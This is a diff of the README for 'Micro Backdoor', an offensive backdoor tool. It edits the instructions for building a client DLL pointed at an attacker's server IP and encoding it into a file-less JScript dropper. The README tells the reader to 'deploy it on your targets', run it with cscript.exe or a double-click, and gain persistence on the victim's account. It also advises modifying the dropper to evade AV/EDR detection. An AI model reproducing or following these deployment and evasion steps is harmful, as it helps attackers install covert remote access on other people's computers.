@@ -81,7 +81,7 @@ $ sudo apt-get install redis-server
 $ sudo service redis-server start
 ```
 
-3) Edit `config.py` file and change default values of `HTTP_USERS` and `HTTP_PATH` values to secure your server installation. Default configuration file have the following values:
+3) Edit `config.py` file and change default values of `HTTP_USERS` and `HTTP_PATH` to secure your server installation. Default configuration file have the following options:
 
 ```python
 
@@ -221,9 +221,9 @@ Host my-server
 
 Micro Backdoor client consists from binary part used to implement backdoor functionality and JScript wrapper combined with the shellcode used to run and deliver the binary part in file-less way.  
 
-⚠️ **JScript and PowerShell code used in client dropper is easily detectable my most of AV/EDR products, you should consider to modify it [or use other methods](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot) to deliver binary part of the client**  
+⚠️ **JScript and PowerShell code used in client dropper is easily detectable my most of AV/EDR products, you should consider to modify it [or use other methods](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot) to deliver the binary part of the client**  
 
-First, you have to configure the binary part with the help of `./client_builder.py` command line program, it operates with the configuration specified in `./server/config.py` file mentioned in previous part of the document:
+First, you have to configure the binary using `./client_builder.py` command line program, it operates with default configuration specified in `./server/config.py` file mentioned in previous part of the document:
 
 ```
 $ ./client_builder.py client.dll [server_IP]
@@ -237,7 +237,7 @@ You can use configured client binary with your own delivery tool: exploit, refle
 $ ./client_encoder.py dll_inject_script client.dll > dropper.js
 ```
 
-After the `dropper.js` was generated you can deploy it on your targets. In Windows command line you can execute JS files in the following way: `cscript.exe dropper.js`. Or you can just double click JS file in Windows Explorer to run the dropper. After the dropper was executed it’s better to wait for 10-20 seconds before deleting JS file. Micro Backdoor client provides persistence within current user account used to run the dropper, it can work with any privileges and medium integrity level.
+After the `dropper.js` was generated you can deploy it on your targets. In Windows command line you can execute JS files in the following way: `cscript.exe dropper.js`. Or you can just double click JS file in Windows Explorer to run the dropper. Micro Backdoor client provides persistence within current user account used to run the dropper, it can work with any privileges and medium integrity level.
 
 ## Developed by
 
